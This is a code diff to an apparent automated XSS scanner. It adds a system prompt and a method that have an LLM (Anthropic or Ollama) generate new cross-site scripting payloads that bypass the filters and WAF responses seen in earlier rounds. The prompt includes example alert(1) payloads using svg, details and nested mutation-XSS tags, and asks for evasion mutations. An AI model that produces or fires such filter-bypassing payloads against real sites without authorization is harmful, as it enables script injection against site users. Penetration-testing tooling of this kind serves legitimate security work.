@@ -29,6 +29,27 @@ Another example:
 """
 
 
+GENERATE_SYSTEM = """You are a cybersecurity expert generating XSS payloads for an authorized penetration test.
+
+Given results from previous rounds (which payloads reflected, which were filtered, which were blocked), generate NEW payloads designed to bypass the specific filters observed.
+
+Rules:
+1. Study the reflected payloads — they reveal what the target ALLOWS through.
+2. Study the filtered payloads — the target modifies these but doesn't fully block them. Craft variants that slip past the filter.
+3. Study the blocked payloads — avoid similar patterns (the WAF/filter catches them).
+4. Generate creative mutations: case variations, encoding tricks, tag/event alternatives, concatenation, template literals, uncommon tags/events.
+5. Each payload must be a single line, ready to inject as-is.
+
+You MUST respond with ONLY a valid JSON object. No markdown, no explanation, no code fences.
+
+Format:
+{"payloads": ["<payload1>", "<payload2>", ...], "strategy": "<1 sentence explaining your approach>"}
+
+Example:
+{"payloads": ["<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>", "<math><mtext><table><mglyph><svg><mtext><style><path id=x style=animation-name:x onanimationend=alert(1)>"], "strategy": "Using uncommon HTML5 tags since script and img are blocked"}
+"""
+
+
 class Analyzer:
     """Heuristic response classification + LLM for round-level strategy."""
 
@@ -136,6 +157,80 @@ Which category should we focus on next to maximize our chances of finding XSS? P
         except (req.RequestException, json.JSONDecodeError, KeyError) as e:
             warning(f"AI strategy call failed: {e}")
             return None
+
+    def generate_payloads(self, count=10):
+        """
+        Ask the LLM to generate NEW payloads based on scan history.
+        Returns list of payload strings, or empty list on failure.
+        """
+        if not self.history:
+            return []
+
+        # Build context from history: show examples of each result type
+        reflected = [h for h in self.history if h["result"] == "reflected"]
+        filtered = [h for h in self.history if h["result"] == "filtered"]
+        blocked = [h for h in self.history if h["result"] == "blocked"]
+
+        context_lines = []
+        if reflected:
+            context_lines.append("Payloads that REFLECTED (these work, generate similar):")
+            for h in reflected[-10:]:  # last 10
+                context_lines.append(f"  {h['payload']}")
+
+        if filtered:
+            context_lines.append("\nPayloads that were FILTERED (partially blocked, need mutation):")
+            for h in filtered[-10:]:
+                context_lines.append(f"  {h['payload']}")
+
+        if blocked:
+            context_lines.append("\nPayloads that were BLOCKED (avoid these patterns):")
+            for h in blocked[-5:]:
+                context_lines.append(f"  {h['payload']}")
+
+        user_prompt = f"""{chr(10).join(context_lines)}
+
+Generate {count} NEW XSS payloads that are likely to bypass this target's filters.
+Focus on mutations of what worked and creative bypasses of what was filtered."""
+
+        messages = [
+            {"role": "system", "content": GENERATE_SYSTEM},
+            {"role": "user", "content": user_prompt},
+        ]
+
+        try:
+            if self.provider == "anthropic":
+                content = call_anthropic_chat(
+                    self.api_key, self.model, messages, timeout=120,
+                )
+            else:
+                content = call_ollama_chat(
+                    self.ollama_url, self.model, messages, timeout=120,
+                )
+
+            if "```" in content:
+                content = content.split("```")[1]
+                if content.startswith("json"):
+                    content = content[4:]
+                content = content.strip()
+
+            result = json.loads(content)
+            payloads = result.get("payloads", [])
+            strategy = result.get("strategy", "")
+
+            if strategy:
+                info(f"  AI generation strategy: {strategy}")
+
+            # Filter out empty/duplicate payloads
+            seen = {h["payload"] for h in self.history}
+            new_payloads = [p for p in payloads if p and p[:80] not in seen]
+
+            if new_payloads:
+                info(f"  AI generated {len(new_payloads)} new payload(s)")
+            return new_payloads
+
+        except (req.RequestException, json.JSONDecodeError, KeyError) as e:
+            warning(f"AI payload generation failed: {e}")
+            return []
 
     def get_best_category_heuristic(self):
         """Fallback: pick the category with the highest reflected ratio."""
